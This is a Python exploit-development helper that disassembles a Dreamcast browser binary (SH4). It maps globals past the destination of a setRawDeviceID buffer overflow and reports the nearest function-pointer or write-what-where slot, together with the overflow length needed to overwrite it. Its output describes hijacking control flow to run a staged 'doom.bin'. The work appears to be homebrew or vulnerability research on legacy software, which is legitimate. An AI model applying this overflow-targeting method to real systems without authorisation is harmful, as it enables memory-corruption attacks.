#!/usr/bin/env python3
"""
native_bssmap.py -- map the BSS region the setRawDeviceID overflow runs into,
and find the NEAREST function-pointer slot (the control-flow target).

The overflow is memcpy(0x8c29abe6, attacker, attacker_len). BSS is zero in the
static image, so we can't read runtime pointers -- instead we classify each
global by how CODE uses it. A function-pointer slot V looks like:
    mov.l <&V>,Rn ; mov.l @Rn,Rm ; jsr @Rm        (call *V)
We enumerate globals in (DST, DST+window), classify each, and report the closest
fn-ptr -- the overflow length to reach+overwrite it is (V - DST + 4).

  python3 native_bssmap.py [window_bytes]
"""
import sys, struct
from capstone import Cs, CS_ARCH_SH, CS_MODE_LITTLE_ENDIAN
import capstone

BIN = "/media/adversary/Storage/dc_browser_extract/dc_extracted/track03_files/1ST_READ.BIN"
BASE = 0x8c010000
DST  = 0x8c29abe6
WIN  = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x4000
d = open(BIN, "rb").read()
N = len(d)

mode = CS_MODE_LITTLE_ENDIAN
for m in ("CS_MODE_SH4A", "CS_MODE_SH4"):
    if hasattr(capstone, m): mode |= getattr(capstone, m); break
MD = Cs(CS_ARCH_SH, mode)

def infile(v): return 0 <= v - BASE < N

def find_loader(litaddr):
    """SH mov.l @(disp,PC),Rn is forward-only; scan back up to 0x404 for the load."""
    for co in range(litaddr - 2, litaddr - 0x404, -2):
        if not infile(co): break
        hw = struct.unpack_from("<H", d, co - BASE)[0]
        if (hw & 0xf000) == 0xd000:                 # 1101 nnnn dddddddd
            rn = (hw >> 8) & 0xf; disp = hw & 0xff
            if ((co + 4) & ~3) + disp * 4 == litaddr:
                return co, rn
    return None, None

def classify(co, rn):
    """disasm forward from loader; decide how the global (held in r{rn}) is used.
    Best (most exploitable) classification wins: FN_PTR / FN_TABLE > WRITE_PTR >
    READ_PTR > PTR_TABLE/DATA_PTR > BYTE/HALF/DWORD."""
    deref = None        # register holding *V (the pointer value), if V is a ptr slot
    cls = "DWORD?"
    for ins in MD.disasm(d[co - BASE: co - BASE + 0x40], co):
        mn, op = ins.mnemonic, ins.op_str.replace(" ", "")
        # V dereferenced: mov.l @rn,rm  -> rm = *V (the stored pointer)
        if mn == "mov.l" and op.startswith("@r%d," % rn):
            deref = op.split(",")[1]; cls = max_cls(cls, "DATA_PTR")
        # indexed table: mov.l @(r0,rn),rm -> rm = V[i]
        elif mn == "mov.l" and op.startswith("@(") and (",r%d)" % rn) in op:
            deref = op.split(",")[-1].rstrip(")"); cls = max_cls(cls, "PTR_TABLE")
        # call through the loaded pointer/table entry -> control-flow target
        elif mn in ("jsr", "jmp") and deref and op == "@%s" % deref:
            return "FN_TABLE" if cls == "PTR_TABLE" else "FN_PTR"
        # store THROUGH the pointer -> write-what-where
        elif mn in ("mov.l", "mov.w", "mov.b") and deref and op.endswith(",@%s" % deref):
            return "WRITE_PTR"
        # read through the pointer
        elif mn in ("mov.l", "mov.w", "mov.b") and deref and op.startswith("@%s," % deref):
            cls = max_cls(cls, "READ_PTR")
        elif mn in ("jsr", "jmp") and op == "@r%d" % rn:
            return "CALL_DIRECT"
        elif mn == "mov.b" and ("r%d" % rn) in op and deref is None:
            cls = max_cls(cls, "BYTE")
        elif mn == "mov.w" and ("r%d" % rn) in op and deref is None:
            cls = max_cls(cls, "HALF")
        elif mn == "mov.l" and op.endswith(",@r%d" % rn) and deref is None:
            cls = max_cls(cls, "DWORD")
        # rn reloaded with something else -> stop
        if "@" not in op and op.endswith(",r%d" % rn) and mn in ("mov", "add", "mova"):
            break
    return cls

RANK = ["DWORD?", "BYTE", "HALF", "DWORD", "DATA_PTR", "PTR_TABLE",
        "READ_PTR", "WRITE_PTR", "FN_TABLE", "FN_PTR", "CALL_DIRECT"]
def max_cls(a, b): return a if RANK.index(a) >= RANK.index(b) else b

def main():
    # collect every distinct global address in (DST, DST+WIN) referenced by a literal
    refs = {}   # gaddr -> list of literal locations
    for off in range(0, N - 3, 2):
        v = struct.unpack_from("<I", d, off)[0]
        if DST <= v < DST + WIN and (off % 4 == 0):
            refs.setdefault(v, []).append(BASE + off)
    print("=== BSS map after DST=%#x (window %#x) ===" % (DST, WIN))
    print("device-ID field = 8 bytes @ %#x; overflow runs upward from here\n" % DST)
    print("  %-12s %-7s %-10s %-5s %s" % ("GLOBAL", "+off", "CLASS", "refs", "example loader"))
    print("  " + "-" * 70)
    CONTROL = ("FN_PTR", "FN_TABLE", "WRITE_PTR", "CALL_DIRECT")
    nearest = None
    rows = []
    for g in sorted(refs):
        co, rn = find_loader(refs[g][0])
        cls = classify(co, rn) if co else "(indirect)"
        rows.append((g, g - DST, cls, len(refs[g]), co))
        if cls in CONTROL and nearest is None:
            nearest = (g, cls, co)
    for g, off, cls, nref, co in rows:
        star = ("  <== " + cls) if cls in CONTROL or cls in ("PTR_TABLE", "READ_PTR", "DATA_PTR") else ""
        print("  %#010x  +%#05x  %-10s %-5d %s%s"
              % (g, off, cls, nref, hex(co) if co else "-", star))
    print()
    if nearest:
        g, cls, co = nearest
        need = g - DST + 4
        print("[*] NEAREST CONTROL PRIMITIVE: %s @ %#010x  (DST + %#x)" % (cls, g, g - DST))
        print("    code site: %#x" % co)
        print("    overflow reach: setRawDeviceID(byte[%d]); bytes [%d..%d] overwrite this slot"
              % (need, g - DST, g - DST + 4))
        if cls in ("FN_PTR", "FN_TABLE"):
            print("    -> last word = SH4 target address: direct control-flow hijack of *%#x" % g)
        elif cls == "WRITE_PTR":
            print("    -> overwrite this pointer => write-what-where; chain to a return addr /")
            print("       fn-ptr for control-flow, then jump to the staged KOS doom.bin")
    else:
        print("[*] no direct control primitive in window; the stride-0x100 struct array")
        print("    (indirect rows) and PTR_TABLE entries are the next things to inspect.")

if __name__ == "__main__":
    main()
